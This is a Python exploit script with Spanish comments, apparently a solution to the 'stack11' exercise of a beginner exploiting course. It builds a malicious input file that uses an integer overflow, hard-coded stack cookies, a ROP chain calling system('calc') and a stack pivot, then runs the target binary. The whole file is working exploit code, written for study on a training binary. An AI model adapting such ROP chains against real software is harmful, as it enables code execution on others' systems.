#Solucion al reto stack11 by hdbreaker
#http://www.ricardonarvaja.info/WEB/EXPLOITING/Nivel%20Basico/014%20stack11.idb/
import os
import struct

#El primer if valida que exista el archivo
f = open("fichero.dat", "w")

#Se lee el primer byte del fichero con fread y se colocan en var_50
var_50 = "\xFF" #Integer overflow 100 bytes to bypass != 100
#Se leen los siguientes 4 bytes y se colocan en var_4C
var_4C = struct.pack("<I", 0x45464748) # Cookie1
#Se leen los siguientes 4 bytes y se colocan en var_48
var_48 = struct.pack("<I", 0x25262728) # Cookie2

#En este buffer pondremos nuestro rop chain porq mas abajo falta espacio y necesitaremos hacer stack sub
rop1 = struct.pack("<I", 0x101014FE) #pop esi => Dejo el puntero a system almacenado en esi
rop2 = struct.pack("<I", 0x101020B0) #Puntero a System
rop3 = struct.pack("<I", 0x10101450) #Pop ecx 
rop4 = "calc" #string de calc a poner en 0x10103210
rop5 = struct.pack("<I", 0x1010164C) #mov eax, ecx
rop6 = struct.pack("<I", 0x10101303) #pop ecx para poner una nueva direccion en ecx
rop7 = struct.pack("<I", 0x10103210) #zona de idata donde podamos escribir
rop8 = struct.pack("<I", 0x1010167A) #xchg eax. [ecx], pop, ret => A Resaltar, xchag copia eax hacia donde apunta ecx, se leede izq a derecha
rop9 = struct.pack("<I", 0x10103220) #basura escribible para evitar errores en los movs posteriores al sub esp, eax
rop10 = struct.pack("<I", 0x101013B8) # mov esi, [esi], mov ecx, esi, call j____guard_check_icall_fptr, call esi llamada indirecta a esi
rop11 = struct.pack("<I", 0x10103210) # Direccion donde metimos "calc" con el xchg

#Construimos nuestro ropChain
ropChain = rop1 + rop2 + rop3 + rop4 + rop5 + rop6 + rop7 + rop8 + rop9 + rop10 + rop11 + 'A' * 16 #Agregamos basura por validacion de 0x64 de largo

#Realizamos un RopSub ya que no tenemos suficiente espacio y nos ponemos sobre la RopChain
#Lo ordeno de en el orden de uso
ropSub3 = struct.pack("<I", 0x10101A1C) #Salto y uso sub esp, eax (mov eax, [esp+8+arg_4]) controlamos esp+8 en el ropPiv1
junk1 = 'B'*8
ropSub2 = struct.pack("<I", 0x10101092) #Salto los push que se meten entre mi RopChain y mi puntero al stack con # add esp, 4 ; pop edi ; pop esi ; pop ebp ; retn
junk2 = 'B'*4
ropSub1 = struct.pack("<I", 0x00000040) #controlo esp+8 para usar el sub esp, eax y ponerme sobre mi RopChain
junk3 = 'B'*16

#Construimos nuestro ropSub 
ropSub = ropSub3 + junk1 + ropSub2 + junk2 + ropSub1 + junk3
#Construimos nuestro Payload
payload = var_50 + var_4C + var_48 + ropChain + ropSub

#Escribimos el Fichero
f.write(payload)
f.close()

#Ejecutamos stack11.exe
os.system("stack11.exe")